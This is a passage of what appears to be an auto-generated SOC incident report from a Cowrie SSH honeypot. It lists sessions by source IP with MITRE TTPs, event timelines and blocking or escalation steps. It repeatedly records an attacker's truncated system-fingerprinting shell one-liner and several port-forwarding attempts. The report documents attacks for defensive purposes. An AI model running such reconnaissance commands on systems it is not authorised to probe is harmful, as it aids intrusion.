| `2026-08-22 16:04:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-860fe6272d58

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 16:05 |
| **Last Seen** | 2026-08-22 16:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:05:34` | `cowrie.session.connect` |
| `2026-08-22 16:05:34` | `cowrie.client.version` |
| `2026-08-22 16:05:34` | `cowrie.client.kex` |
| `2026-08-22 16:05:35` | `cowrie.login.success` |
| `2026-08-22 16:05:37` | `cowrie.session.params` |
| `2026-08-22 16:05:37` | `cowrie.command.input` |
| `2026-08-22 16:05:37` | `cowrie.command.input` |
| `2026-08-22 16:05:37` | `cowrie.command.input` |
| `2026-08-22 16:05:37` | `cowrie.command.input` |
| `2026-08-22 16:05:37` | `cowrie.command.input` |
| `2026-08-22 16:05:37` | `cowrie.command.success` |
| `2026-08-22 16:05:37` | `cowrie.command.input` |
| `2026-08-22 16:05:37` | `cowrie.command.input` |
| `2026-08-22 16:05:37` | `cowrie.command.input` |
| `2026-08-22 16:05:37` | `cowrie.command.input` |
| `2026-08-22 16:05:38` | `cowrie.log.closed` |
| `2026-08-22 16:05:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bbaa79e33dd

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 16:06 |
| **Last Seen** | 2026-08-22 16:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:06:49` | `cowrie.session.connect` |
| `2026-08-22 16:06:49` | `cowrie.client.version` |
| `2026-08-22 16:06:49` | `cowrie.client.kex` |
| `2026-08-22 16:06:51` | `cowrie.login.success` |
| `2026-08-22 16:06:52` | `cowrie.session.params` |
| `2026-08-22 16:06:52` | `cowrie.command.input` |
| `2026-08-22 16:06:52` | `cowrie.command.input` |
| `2026-08-22 16:06:52` | `cowrie.command.input` |
| `2026-08-22 16:06:53` | `cowrie.command.input` |
| `2026-08-22 16:06:53` | `cowrie.command.input` |
| `2026-08-22 16:06:53` | `cowrie.command.success` |
| `2026-08-22 16:06:53` | `cowrie.command.input` |
| `2026-08-22 16:06:53` | `cowrie.command.input` |
| `2026-08-22 16:06:53` | `cowrie.command.input` |
| `2026-08-22 16:06:53` | `cowrie.command.input` |
| `2026-08-22 16:06:53` | `cowrie.log.closed` |
| `2026-08-22 16:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc5bf5814a74

| Field | Detail |
|---|---|
| **Source IP** | `189.52.52[.]162` |
| **First Seen** | 2026-08-22 16:07 |
| **Last Seen** | 2026-08-22 16:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:07:09` | `cowrie.session.connect` |
| `2026-08-22 16:07:10` | `cowrie.client.version` |
| `2026-08-22 16:07:10` | `cowrie.client.kex` |
| `2026-08-22 16:07:12` | `cowrie.login.success` |
| `2026-08-22 16:07:13` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:07:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.52.52[.]162` to AbuseIPDB if not already reported
- [ ] Block `189.52.52[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-475d7c96c212

| Field | Detail |
|---|---|
| **Source IP** | `64.33.178[.]57` |
| **First Seen** | 2026-08-22 16:07 |
| **Last Seen** | 2026-08-22 16:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:07:18` | `cowrie.session.connect` |
| `2026-08-22 16:07:18` | `cowrie.client.version` |
| `2026-08-22 16:07:18` | `cowrie.client.kex` |
| `2026-08-22 16:07:20` | `cowrie.login.success` |
| `2026-08-22 16:07:20` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.33.178[.]57` to AbuseIPDB if not already reported
- [ ] Block `64.33.178[.]57` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23fdac59aad0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 16:08 |
| **Last Seen** | 2026-08-22 16:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:08:01` | `cowrie.session.connect` |
| `2026-08-22 16:08:02` | `cowrie.client.version` |
| `2026-08-22 16:08:02` | `cowrie.client.kex` |
| `2026-08-22 16:08:03` | `cowrie.login.success` |
| `2026-08-22 16:08:05` | `cowrie.session.params` |
| `2026-08-22 16:08:05` | `cowrie.command.input` |
| `2026-08-22 16:08:05` | `cowrie.command.input` |
| `2026-08-22 16:08:05` | `cowrie.command.input` |
| `2026-08-22 16:08:05` | `cowrie.command.input` |
| `2026-08-22 16:08:05` | `cowrie.command.input` |
| `2026-08-22 16:08:05` | `cowrie.command.success` |
| `2026-08-22 16:08:05` | `cowrie.command.input` |
| `2026-08-22 16:08:05` | `cowrie.command.input` |
| `2026-08-22 16:08:05` | `cowrie.command.input` |
| `2026-08-22 16:08:05` | `cowrie.command.input` |
| `2026-08-22 16:08:05` | `cowrie.log.closed` |
| `2026-08-22 16:08:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c479b303685

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 16:09 |
| **Last Seen** | 2026-08-22 16:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:09:15` | `cowrie.session.connect` |
| `2026-08-22 16:09:16` | `cowrie.client.version` |
| `2026-08-22 16:09:16` | `cowrie.client.kex` |
| `2026-08-22 16:09:17` | `cowrie.login.success` |
| `2026-08-22 16:09:18` | `cowrie.session.params` |
| `2026-08-22 16:09:18` | `cowrie.command.input` |
| `2026-08-22 16:09:18` | `cowrie.command.input` |
| `2026-08-22 16:09:18` | `cowrie.command.input` |
| `2026-08-22 16:09:18` | `cowrie.command.input` |
| `2026-08-22 16:09:18` | `cowrie.command.input` |
| `2026-08-22 16:09:18` | `cowrie.command.success` |
| `2026-08-22 16:09:18` | `cowrie.command.input` |
| `2026-08-22 16:09:18` | `cowrie.command.input` |
| `2026-08-22 16:09:18` | `cowrie.command.input` |
| `2026-08-22 16:09:18` | `cowrie.command.input` |
| `2026-08-22 16:09:18` | `cowrie.log.closed` |
| `2026-08-22 16:09:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-718840cf2938

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 16:09 |
| **Last Seen** | 2026-08-22 16:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:09:48` | `cowrie.session.connect` |
| `2026-08-22 16:09:48` | `cowrie.client.version` |
| `2026-08-22 16:09:48` | `cowrie.client.kex` |
| `2026-08-22 16:09:49` | `cowrie.login.success` |
| `2026-08-22 16:09:49` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:09:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 16:09:49` | `cowrie.direct-tcpip.data` |
| `2026-08-22 16:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53b90d897a12

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-22 16:09 |
| **Last Seen** | 2026-08-22 16:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:09:52` | `cowrie.session.connect` |
| `2026-08-22 16:09:52` | `cowrie.client.version` |
| `2026-08-22 16:09:52` | `cowrie.client.kex` |
| `2026-08-22 16:09:53` | `cowrie.login.success` |
| `2026-08-22 16:09:53` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:09:53` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-22 16:09:53` | `cowrie.direct-tcpip.data` |
| `2026-08-22 16:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35e5e346017d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 16:10 |
| **Last Seen** | 2026-08-22 16:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:10:34` | `cowrie.session.connect` |
| `2026-08-22 16:10:34` | `cowrie.client.version` |
| `2026-08-22 16:10:34` | `cowrie.client.kex` |
| `2026-08-22 16:10:35` | `cowrie.login.success` |
| `2026-08-22 16:10:37` | `cowrie.session.params` |
| `2026-08-22 16:10:37` | `cowrie.command.input` |
| `2026-08-22 16:10:37` | `cowrie.command.input` |
| `2026-08-22 16:10:37` | `cowrie.command.input` |
| `2026-08-22 16:10:37` | `cowrie.command.input` |
| `2026-08-22 16:10:37` | `cowrie.command.input` |
| `2026-08-22 16:10:37` | `cowrie.command.success` |
| `2026-08-22 16:10:37` | `cowrie.command.input` |
| `2026-08-22 16:10:37` | `cowrie.command.input` |
| `2026-08-22 16:10:37` | `cowrie.command.input` |
| `2026-08-22 16:10:37` | `cowrie.command.input` |
| `2026-08-22 16:10:37` | `cowrie.log.closed` |
| `2026-08-22 16:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15382d92661c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 16:12 |
| **Last Seen** | 2026-08-22 16:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:12:01` | `cowrie.session.connect` |
| `2026-08-22 16:12:02` | `cowrie.client.version` |
| `2026-08-22 16:12:02` | `cowrie.client.kex` |
| `2026-08-22 16:12:03` | `cowrie.login.success` |
| `2026-08-22 16:12:04` | `cowrie.session.params` |
| `2026-08-22 16:12:04` | `cowrie.command.input` |
| `2026-08-22 16:12:04` | `cowrie.command.input` |
| `2026-08-22 16:12:04` | `cowrie.command.input` |
| `2026-08-22 16:12:04` | `cowrie.command.input` |
| `2026-08-22 16:12:04` | `cowrie.command.input` |
| `2026-08-22 16:12:04` | `cowrie.command.success` |
| `2026-08-22 16:12:04` | `cowrie.command.input` |
| `2026-08-22 16:12:04` | `cowrie.command.input` |
| `2026-08-22 16:12:04` | `cowrie.command.input` |
| `2026-08-22 16:12:04` | `cowrie.command.input` |
| `2026-08-22 16:12:04` | `cowrie.log.closed` |
| `2026-08-22 16:12:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3812816b2015

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 16:13 |
| **Last Seen** | 2026-08-22 16:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:13:28` | `cowrie.session.connect` |
| `2026-08-22 16:13:28` | `cowrie.client.version` |
| `2026-08-22 16:13:28` | `cowrie.client.kex` |
| `2026-08-22 16:13:29` | `cowrie.login.success` |
| `2026-08-22 16:13:30` | `cowrie.session.params` |
| `2026-08-22 16:13:30` | `cowrie.command.input` |
| `2026-08-22 16:13:30` | `cowrie.command.input` |
| `2026-08-22 16:13:30` | `cowrie.command.input` |
| `2026-08-22 16:13:30` | `cowrie.command.input` |
| `2026-08-22 16:13:30` | `cowrie.command.input` |
| `2026-08-22 16:13:30` | `cowrie.command.success` |
| `2026-08-22 16:13:30` | `cowrie.command.input` |
| `2026-08-22 16:13:30` | `cowrie.command.input` |
| `2026-08-22 16:13:30` | `cowrie.command.input` |
| `2026-08-22 16:13:30` | `cowrie.command.input` |
| `2026-08-22 16:13:30` | `cowrie.log.closed` |
| `2026-08-22 16:13:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b03d8c0ca3de

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 16:14 |
| **Last Seen** | 2026-08-22 16:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:14:50` | `cowrie.session.connect` |
| `2026-08-22 16:14:50` | `cowrie.client.version` |
| `2026-08-22 16:14:50` | `cowrie.client.kex` |
| `2026-08-22 16:14:51` | `cowrie.login.success` |
| `2026-08-22 16:14:52` | `cowrie.session.params` |
| `2026-08-22 16:14:52` | `cowrie.command.input` |
| `2026-08-22 16:14:52` | `cowrie.command.input` |
| `2026-08-22 16:14:52` | `cowrie.command.input` |
| `2026-08-22 16:14:52` | `cowrie.command.input` |
| `2026-08-22 16:14:52` | `cowrie.command.input` |
| `2026-08-22 16:14:52` | `cowrie.command.success` |
| `2026-08-22 16:14:52` | `cowrie.command.input` |
| `2026-08-22 16:14:52` | `cowrie.command.input` |
| `2026-08-22 16:14:52` | `cowrie.command.input` |
| `2026-08-22 16:14:52` | `cowrie.command.input` |
| `2026-08-22 16:14:53` | `cowrie.log.closed` |
| `2026-08-22 16:14:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96a408d393cc

| Field | Detail |
|---|---|
| **Source IP** | `120.243.121[.]6` |
| **First Seen** | 2026-08-22 16:15 |
| **Last Seen** | 2026-08-22 16:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:15:27` | `cowrie.session.connect` |
| `2026-08-22 16:15:27` | `cowrie.client.version` |
| `2026-08-22 16:15:27` | `cowrie.client.kex` |
| `2026-08-22 16:15:29` | `cowrie.login.success` |
| `2026-08-22 16:15:30` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.243.121[.]6` to AbuseIPDB if not already reported
- [ ] Block `120.243.121[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-555d5dc288f4

| Field | Detail |
|---|---|
| **Source IP** | `201.28.234[.]10` |
| **First Seen** | 2026-08-22 16:15 |
| **Last Seen** | 2026-08-22 16:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:15:35` | `cowrie.session.connect` |
| `2026-08-22 16:15:36` | `cowrie.client.version` |
| `2026-08-22 16:15:36` | `cowrie.client.kex` |
| `2026-08-22 16:15:38` | `cowrie.login.success` |
| `2026-08-22 16:15:38` | `cowrie.direct-tcpip.request` |
| `2026-08-22 16:15:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.28.234[.]10` to AbuseIPDB if not already reported
- [ ] Block `201.28.234[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a19adc89efb

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]232` |
| **First Seen** | 2026-08-22 16:16 |
| **Last Seen** | 2026-08-22 16:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-22 16:16:10` | `cowrie.session.connect` |
| `2026-08-22 16:16:11` | `cowrie.client.version` |
| `2026-08-22 16:16:11` | `cowrie.client.kex` |
| `2026-08-22 16:16:12` | `cowrie.login.success` |
| `2026-08-22 16:16:13` | `cowrie.session.params` |
| `2026-08-22 16:16:13` | `cowrie.command.input` |
| `2026-08-22 16:16:13` | `cowrie.command.input` |
| `2026-08-22 16:16:13` | `cowrie.command.input` |
| `2026-08-22 16:16:13` | `cowrie.command.input` |
| `2026-08-22 16:16:13` | `cowrie.command.input` |
| `2026-08-22 16:16:13` | `cowrie.command.success` |
| `2026-08-22 16:16:13` | `cowrie.command.input` |
| `2026-08-22 16:16:13` | `cowrie.command.input` |
| `2026-08-22 16:16:13` | `cowrie.command.input` |
| `2026-08-22 16:16:13` | `cowrie.command.input` |
| `2026-08-22 16:16:13` | `cowrie.log.closed` |
| `2026-08-22 16:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]232` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76c023057bc8

| Field | Detail |
|---|---|
